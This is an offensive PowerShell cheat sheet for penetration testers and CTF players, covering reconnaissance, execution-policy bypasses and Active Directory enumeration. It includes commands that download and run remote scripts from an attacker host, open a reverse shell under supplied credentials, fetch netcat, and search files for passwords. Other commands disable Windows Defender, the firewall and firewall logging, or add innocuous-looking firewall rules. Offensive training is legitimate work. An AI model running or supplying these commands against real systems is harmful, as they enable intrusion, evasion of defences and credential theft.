# Powershell (Offensive)

This page contains some useful commands for penetration testers. Note that most of these commands are only useful in CTF style environments as they would be logged and alerted on by any decent corporate blue team, especially if they are run in succession. In addition, only some of these commands will work when being run as a regular user, others will require administrator privileges.

{% hint style="info" %}
Note that not all the commands below work on all versions of Powershell.

Where possible I have included the version information.
{% endhint %}

## Helpful Commands

Get the commands for a specified module:

```
Get-Command -Module NetSecurity
```

Get available properties for objects returned by a command:

```
Get-Service | Get-Member -MemberType Property
```

List available modules:

```
Get-Module
Get-Module -ListAvailable
```

Check the execution policy for powershell scripts:

```
Get-ExecutionPolicy
Get-ExecutionPolicy -Scope CurrentUser
Get-ExecutionPolicy -List | Format-Table -AutoSize
```

Import a module:

```
Import-Module PowerSploit
Get-Command -Module PowerSploit
```

Get help for module or command:

```
Get-Command -Module PowerSploit
Get-Help Get-System -examples
```

## Command/Script Execution

Get the execution policy:

```
Get-ExecutionPolicy
Get-ExecutionPolicy -List | Format-Table -AutoSize
```

Set the execution policy:

```
Set-ExecutionPolicy Bypass -Scope CurrentUser
```

Bypass execution restriction only for a specific operation/command:

```
powershell.exe -ExecutionPolicy Bypass -File C:\file.ps1
powershell.exe -ExecutionPolicy Bypass "Get-ACL c:\users\administrator | Select -ExpandProperty AccessToString"
```

Bypass execution restriction by piping the content of a locally stored script into Powershell:

```
Get-Content c:\windows\temp\file.ps1 | powershell.exe -noprofile -
type c:\windows\temp\file.ps1 | powershell.exe -noprofile -
```

Bypass execution restriction by downloading and executing a script from memory:

```
powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://10.x.x.x/file.ps1')"
```

Bypass execution restriction by using the "command" switch:

```
powershell -c "Get-ACL c:\users\administrator | Select -ExpandProperty AccessToString"
```

### Powershell Execution Policies

| Policy         | Description                                                                                                                                          |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| `AllSigned`    | Only scripts signed by a trusted publisher can be run.                                                                                               |
| `Bypass`       | No restrictions; all Windows PowerShell scripts can be run.                                                                                          |
| `Default`      | Normally `RemoteSigned`, but is controlled via ActiveDirectory                                                                                       |
| `RemoteSigned` | Downloaded scripts must be signed by a trusted publisher before they can be run.                                                                     |
| `Restricted`   | No scripts can be run. Windows PowerShell can be used only in interactive mode.                                                                      |
| `Undefined`    | NA                                                                                                                                                   |
| `Unrestricted` | Similar to `bypass,` however, _If you run an unsigned script that was downloaded from the Internet, you are prompted for permission before it runs._ |

## Information Gathering

Get the powershell version/s:

```
$PSVersionTable
```

Ge the Powershell module paths on the system:

```
$Env:PSModulePath
```



Get the OS Architecture:

> For \[IntPtr]::Size output:
>
> 4 = 32bit
>
> 8 = 64bit

```
$ENV:PROCESSOR_ARCHITECTURE
(Get-CimInstance Win32_operatingsystem).OSArchitecture
(Get-WmiObject Win32_OperatingSystem).OSArchitecture
[IntPtr]::Size
```

Get the dotnet version/s:

```
Get-ChildItem -recurse "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP" | Get-ItemProperty | Where { $_ -match 'Version' }
```

Get the running processes:

```
Get-Process
```

Get the services:

```
Get-Service
```

Get only the 'Running' services:

```
Get-Service | Where-Object { $_.Status -match 'Running'}
Get-Service | Where-Object { $_.Status -like 'Running'}
```

Get the installed hotfixes:

```
Get-Hotfix
```

Get a list of interfaces:

```
Get-NetIPInterface
```

Get list of listening TCP ports:

```
Get-NetTcpConnection -State Listen
```

## File Operations

Get the access list permissions of a directory or file:

```
Get-ACL c:\users\administrator | fl *
Get-ACL c:\users\administrator |  Select -ExpandProperty AccessToString
```

> fl = Format-List

Find specified strings in files:

```
Select-String -path c:\*.* -pattern password
Select-String –path c:\users\*.txt –pattern password
ls -r c:\users\*.txt -file | % {Select-String -path $_ -pattern password}
```

View a file:

```
Get-Content file.txt
```

## Windows Firewall

{% hint style="info" %}
&#x20;Get-NetFirewallRule is part of the NetSecurity built-in module which was released from Windows 8.1 and Server 2012 R2 and later. For previous versions of Windows, use the "netsh advfirewall firewall" command.
{% endhint %}

Get enabled firewall rules and only display selected parameters (does not contain port numbers):

```
Get-NetFirewallRule | Where {$_.Enabled -eq "True"} | Select DisplayName,Direction,Profile,Action,Description
```

Get enabled firewall rules (does not contain port numbers), only display selected parameters and output to a csv file:

```
Get-NetFirewallRule | Where {$_.Enabled -eq "True"} | Select DisplayName,Direction,Profile,Action,Description | Export-CSV fw.csv
```

Get the firewall rules, ports and addresses in a formatted table output:

```
Get-NetFirewallRule -Action Allow -Enabled True -Direction Inbound |
Format-Table -Property Name,
@{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},
@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}},
@{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},
@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}},
Enabled,Profile,Direction,Action
```

Get the firewall rules and related ports and addresses, and output to a CSV file:

```
Get-NetFirewallRule -Name '*' | Where-Object {$_.Enabled -eq 'True' -and $_.Direction -eq 'Inbound'} | Select-Object Name, DisplayName, DisplayGroup, Action, @{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}}, @{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}}, @{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}}, @{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}}, Profile | Export-Csv -Path "C:\Users\Public\fw.csv" -NoTypeInfo -Delim "," | Import-Csv -Path "C:\Users\Public\fw.csv"
```

Get the firewall profiles and their status:

```
Get-NetFirewallProfile | Select-Object Name, Enabled
```

Disable specified firewall profile:

```
Set-NetFirewallProfile -Profile Public -Enabled False
```

Disable all firewall profiles:

```
Set-NetFirewallProfile -All -Enabled False
```

Set the default action for the specified profile to allow all inbound connections:

```
Set-NetFirewallProfile –Name Public –DefaultInboundAction Allow
```

Set the default action for all profiles to allow all inbound connections:

```
Set-NetFirewallProfile –All –DefaultInboundAction Allow
```

Get the profile settings for a firewall policy managed by a GPO:

```
Get-NetFirewallProfile -policystore activestore
```

Check if the firewall is disabled on any interface:

> If the output is the following then the firewall is enabled on the interface.
>
> DisabledInterfaceAliases : {Ethernet0}&#x20;

```
Get-NetFirewallProfile -All | fl DisabledInterfaceAliases
```

Disable firewall logging:

```
Set-NetFireWallProfile -All -LogBlocked False -LogAllowed False -LogIgnored False
```

Add rule to allow inbound connections on ports 80 and 443:

```
New-NetFirewallRule -DisplayName 'Do not delete - helpdesk' -Profile @('Domain', 'Private', 'Public') -Direction Inbound -Action Allow -Protocol TCP -LocalPort @('80', '443')
```

Add rule to allow the specified app:

```
New-NetFirewallRule -DisplayName 'Allow the cat' -Program "C:\Windows\Temp\ncat.exe" -Action Allow -Profile Any -Direction Outbound
```

Add rule to allow inbound connection on the specified port from the specified IP:

```
New-NetFirewallRule -DisplayName 'For helpdesk access' –RemoteAddress 10.10.14.27 -Direction Inbound -Protocol TCP –LocalPort 1337 -Action Allow
```

## Anti-Virus

Get the installed Anti-virus products for older versions of Windows (requires Powershell 3.0 or higher):

```
Get-CimInstance -Namespace root/SecurityCenter -ClassName AntivirusProduct
```

Get the installed Anti-virus products for newer versions of Windows (requires Powershell 3.0 or higher):

```
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
```

Get list of commands for the "Defender" module:

```
Get-Command -Module Defender
```

Check if the "Defender" service is running:

```
Get-service Windefend
```

Get the current status of "Defender", virus definition date and version, last update date, and much more:

```
Get-MpComputerStatus
```

Get status of various "Defender" components:

```
Get-MpComputerStatus | Select-Object -Property Antivirusenabled,AMServiceEnabled,AntispywareEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled,NISEnabled,OnAccessProtectionEnabled,RealTimeProtectionEnabled,AntivirusSignatureLastUpdated
```

Check which features are "Disabled":

```
Get-MpPreference | fl disable*
```

Disable Real Time Monitoring in "Defender":

```
Set-MpPreference -DisableRealtimeMonitoring $true
```

Disable the IPS system:

```
Set-MpPreference -DisableIntrusionPreventionSystem $true
```

Disable "Defender" completely:

```
New-ItemProperty -Path “HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender” -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
```

Add exclusion paths to the anti-virus exclusion list:

```
Add-MpPreference -ExclusionPath C:\, D:\
```

Remove an exclusion path:

```
Remove-MpPreference -ExclusionPath C:\
```

Exclude a process from anti-virus scans:

```
Set-MpPreference -ExclusionProcess "powershell.exe"
```

## Credentials

Create a credential object:

```
$username = 'Administrator'
$password = ConvertTo-SecureString 'Password1' -AsPlainText -Force
$credentialsObject = New-Object System.Management.Automation.PSCredential($username, $password)
```

Run a command with the credentials object. In the example below, we are connecting to the attack machine to download and execute the "InvokePowershellTcp" script which will make a new reverse powershell connection as the "credentialsObject" user:

```
Start-Process -FilePath "powershell" -ArgumentList "IEX(New-Object Net.WebClient).DownloadString('http://10.x.x.x/Invoke-PowerShellTcp.ps1')" -Credential $credentialsObject
```

## Applocker

Get the "Effective" applocker policy:

```
Get-ApplockerPolicy -Effective | Select -ExpandProperty RuleCollections
```

Get the "Local" applocker policy:

```
Get-AppLockerPolicy -Local
```

Get the "Domain" applocker policy:

```
Get-AppLockerPolicy -Domain
```

## File Transfers

Download a file using "System.Net.WebClient" (DownloadFile method):

```
(New-Object System.Net.WebClient).DownloadFile('http://10.x.x.x/nc.exe','c:\windows\temp\nc.exe')   
```

Download a file using "System.Net.WebClient" (DownloadString method with IEX cmdlet):

```
IEX (New-Object System.Net.WebClient).DownloadString('http://10.x.x.x/file.ps1')
```

## Active Directory

Commands below require the "ActiveDirectory" module to be installed:

Gather domain information:

```
Get-ADDomain
Get-DomainSID
Get-ADDomainController
Get-ADDomainController -Identity <DomainName>
Get-ADTrust -Filter *
Get-ADTrust -Identity <DomainName>
Get-ADForest
Get-ADForest -Identity <ForestName>
(Get-ADForest).Domains
Get-ADUser -Identity Administrator -Properties *
Get-ADUser -Filter 'Name -like "*SvcAccount"' | Format-Table Name,SamAccountName -A
Get-ADUser -LDAPFilter '(!userAccountControl:1.2.840.113556.1.4.803:=2)'
Get-ADComputer
Get-ADComputer -Filter *
Get-ADComputer -Filter 'Name -like "comp*"' -Properties IPv4Address | FT Name,DNSHostName,IPv4Address -A
Get-ADComputerServiceAccount
Get-ADGroup
Get-ADGroup -Identity Administrators
Get-ADGroupMember
Get-ADGroupMember -Identity Administrators
Get-ADPrincipalGroupMembership -Identity Administrator
```

Get list of Service Principle Names for a specified domain:

> \-T = perform query on the speicified domain or forest (when -F is also used)
>
> \-Q = query for existence of SPN

```
SetSPN -T domain.name -Q */*
```













